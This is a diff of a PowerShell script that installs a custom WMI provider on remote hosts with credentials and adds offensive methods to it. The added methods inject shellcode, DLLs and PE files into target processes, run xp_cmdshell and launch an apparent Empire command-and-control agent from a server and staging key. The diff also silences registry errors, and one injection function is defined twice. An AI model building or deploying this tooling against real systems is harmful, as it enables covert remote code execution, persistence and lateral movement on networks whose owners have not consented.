@@ -499,10 +499,30 @@ Function Install-WMIProviderExtention {
         Add-WMIMethodRunPowerShell -Class $([ref] $Class)
         Add-WMIMethodRunXpCmdShell -Class $([ref] $Class)
         Add-WMIMethodInjectDll -Class $([ref] $Class)
+        Add-WMIMethodInjectDllWMIFS -Class $([ref] $Class)
+        Add-WMIMethodInjectPeFile -Class $([ref] $Class)
+        Add-WMIMethodInjectPeString -Class $([ref] $Class)
+        Add-WMIMethodInjectPeWMIFS -Class $([ref] $Class)
+        Add-WMIMethodInjectShellCode -Class $([ref] $Class)
+        Add-WMIMethodInjectShellCodeWMFIFSB4 -Class $([ref] $Class)
+        Add-WMIMethodEmpire -Class $([ref] $Class)
         $null = $Class.put()
-	
-	Invoke-WMICreateExtensionKeysAndValues -hDefKey $hkcr -sSubKeyName $hkcr_keys -ComputerName $ComputerName -Credential $Credential
+	    
+        <#
+	    Invoke-WMICreateExtensionKeysAndValues -hDefKey $hkcr -sSubKeyName $hkcr_keys -ComputerName $ComputerName -Credential $Credential
         Invoke-WMICreateExtensionKeysAndValues -hDefKey $hklm -sSubKeyName $hklm_keys -ComputerName $ComputerName -Credential $Credential
+        #>
+
+        $ScriptBlock = {
+            Write-Verbose ("Creating Key: {0}:{1}" -f ($hive, $_))
+            Invoke-WMICreateExtensionKeysAndValues -hDefKey $hive -sSubKeyName $_ -ComputerName $ComputerName -Credential $Credential
+        }
+
+        $hive = $hkcr
+        $hkcr_keys | Invoke-Parallel -ImportVariables -ScriptBlock $ScriptBlock -ImportFunctions
+        $hive = $hklm
+        $hklm_keys | Invoke-Parallel -ImportVariables -ScriptBlock $ScriptBlock -ImportFunctions
+
     } End {
 
     }
@@ -552,9 +572,10 @@ Function Uninstall-WMIProviderExtention {
         $null = Get-WmiObject -Class __MethodProviderRegistration -ComputerName $ComputerName -Credential $Credential | ? Provider -Like "*$AssemblyName*" | Remove-WmiObject
         Write-Verbose "Removing $ClassName"
         Get-WmiObject -Class $ClassName
-
+        <#
         Invoke-WMIDeleteExtensionKeys -hDefKey $hkcr -sSubKeyName $hkcr_keys -ComputerName $ComputerName -Credential $Credential
         Invoke-WMIDeleteExtensionKeys -hDefKey $hklm -sSubKeyName $hklm_keys -ComputerName $ComputerName -Credential $Credential
+        #>
     } End {
 
     }
@@ -563,14 +584,14 @@ Function Uninstall-WMIProviderExtention {
 #region StdRegProv Functions
 ################################################################################
 ################################################################################
-Function local:Invoke-WmiCreateExtensionKeysAndValues {
+Function Invoke-WmiCreateExtensionKeysAndValues {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$true, HelpMessage="Address of the system to connect to. Defaults to localhost.")]
             [string]$ComputerName = ".",
         [Parameter(Mandatory=$false, HelpMessage="Credential object used authenticate to remote WMI service.")]
             [PSCredential]$Credential,
-
+            
         [Parameter(Mandatory=$true, HelpMessage="The registry hive to access.")]
             [string]$hDefKey,
         [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
@@ -625,7 +646,7 @@ Function local:Invoke-CreateKeyChecked {
         [Parameter(Mandatory=$true, HelpMessage="The registry key name to create.")]
             [string]$sSubKeyName
     )
-    $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name CreateKey -ArgumentList $hDefKey, $sSubKeyName
+    $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name CreateKey -ArgumentList $hDefKey, $sSubKeyName -ErrorAction SilentlyContinue
     if ($output.ReturnValue -ne 0) {
         Write-Warning "Error Creating $($output.ReturnValue) : $hDefKey : $sSubKeyName"
     }
@@ -650,9 +671,9 @@ Function local:Invoke-SetStringValueChecked {
         [Parameter(Mandatory=$true, HelpMessage="The restry entry value to set.")]
             [string]$sValue 
     )
-    $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name SetStringValue -ArgumentList $hDefKey, $sSubKeyName, $sValueName, $sValue
+    $output = Invoke-WmiMethod -ComputerName $ComputerName -Credential $Credential -Class StdRegProv -Name SetStringValue -ArgumentList $hDefKey, $sSubKeyName, $sValueName, $sValue -ErrorAction SilentlyContinue
     if ($output.ReturnValue -ne 0) {
-        Write-Warning "Error writing $($output.ReturnValue) : $hDefKey : $sSubKeyName : $sValueName"
+        Write-Warning "Error Writing $($output.ReturnValue) : $hDefKey : $sSubKeyName : $sValueName"
     }
 }
 #endregion
@@ -667,9 +688,12 @@ Function local:Add-WMIMethodRunCMD {
         [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
             [System.Management.ManagementClass][ref]$Class
     )
-    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
-    $parameters = New-WMIMethodParameter -Direction In -Property parameters -CimType String
-    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunCMD" -MethodInParameters @($command, $parameters)
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property command -CimType String),
+        (New-WMIMethodParameter -Direction In -Property parameters -CimType String)
+    )
+    Write-Verbose "Creating RunCmd"
+    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunCMD" -MethodInParameters $parameters
 }
 
 ################################################################################
@@ -681,13 +705,15 @@ Function local:Add-WMIMethodRunPowerShell {
         [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
             [System.Management.ManagementClass][ref]$Class
     )
-    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
-    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
-    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunPowerShell" -MethodInParameters @($command)
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property command -CimType String)
+    )
+    Write-Verbose "Creating RunPowerShell"
+    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunPowerShell" -MethodInParameters $parameters
 }
 
 ################################################################################
-# Execute a command via xp_cmdshell
+# Execute a powershell command
 ################################################################################
 Function local:Add-WMIMethodRunXpCmdShell {
     [CmdletBinding()]
@@ -695,12 +721,65 @@ Function local:Add-WMIMethodRunXpCmdShell {
         [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
             [System.Management.ManagementClass][ref]$Class
     )
-    $server = New-WMIMethodParameter -Direction In -Property server -CimType String
-    $database = New-WMIMethodParameter -Direction In -Property database -CimType String
-    $sqlusername = New-WMIMethodParameter -Direction In -Property username -CimType String
-    $sqlpassword = New-WMIMethodParameter -Direction In -Property password -CimType String
-    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
-    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "RunXpCmdShell" -MethodInParameters @($server, $database, $sqlusername, $sqlpassword, $command)
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property Server -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Database -CimType String),
+        (New-WMIMethodParameter -Direction In -Property UserName -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Password -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Command -CimType String)
+    )
+    Write-Verbose "Creating RunXpCmdShell"
+    Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName RunXpCmdShell -MethodInParameters $parameters
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodInjectShellCode {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass][ref]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property ShellCodeString -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectShellCode"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectShellCode -MethodInParameters $parameters
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodInjectShellCodeWMFIFSB4 {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass][ref]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
+        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectShellCodeWMFIFSB4"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectShellCodeWMFIFSB4 -MethodInParameters $parameters
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodInjectShellCodeWMFIFSB4 {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass][ref]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
+        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectShellCodeWMFIFSB4"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectShellCodeWMFIFSB4 -MethodInParameters $parameters
 }
 
 ################################################################################
@@ -711,24 +790,101 @@ Function local:Add-WMIMethodInjectDll {
         [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
             [System.Management.ManagementClass]$Class
     )
-    $dllName = New-WMIMethodParameter -Direction In -Property dllName -CimType String
-    $process = New-WMIMethodParameter -Direction In -Property process -CimType String
-    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
-    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName "InjectDll" -MethodInParameters @($dllName, $process)
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property Library -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectDll"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectDll -MethodInParameters $parameters
 }
 
 ################################################################################
 ################################################################################
-Function local:Add-WMIMethodInjectDllRemote {
+Function local:Add-WMIMethodInjectDllWMIFS {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
             [System.Management.ManagementClass]$Class
     )
-    $dllName = New-WMIMethodParameter -Direction In -Property dllName -CimType String
-    $process = New-WMIMethodParameter -Direction In -Property process -CimType String
-    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
-    return Add-WMIProviderClassMethod -Class $Class -MethodName InjectDll -MethodInParameters @($dllName, $process)
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
+        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectDllWMIFS"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectDllWMIFS -MethodInParameters $parameters
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodInjectPeFile {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Parameters -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectPeFile"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectPeFile -MethodInParameters $parameters
+
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodInjectPeString {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property PeString -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Parameters -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectPeString"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectPeString -MethodInParameters $parameters
+
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodInjectPeWMIFS {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property WmiClass -CimType String),
+        (New-WMIMethodParameter -Direction In -Property FileName -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Parameters -CimType String),
+        (New-WMIMethodParameter -Direction In -Property ProcessId -CimType SInt32)
+    )
+    Write-Verbose "Creating InjectPeWMIFS"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName InjectPeWMIFS -MethodInParameters $parameters
+
+}
+
+################################################################################
+################################################################################
+Function local:Add-WMIMethodEmpire {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $parameters = @(
+        (New-WMIMethodParameter -Direction In -Property Server -CimType String),
+        (New-WMIMethodParameter -Direction In -Property StagingKey -CimType String),
+        (New-WMIMethodParameter -Direction In -Property Language -CimType String)
+    )
+    Write-Verbose "Creating Empire"
+    return Add-WMIProviderClassMethod -Class $([ref] $Class) -MethodName Empire -MethodInParameters $parameters
 
 }
 #endregion
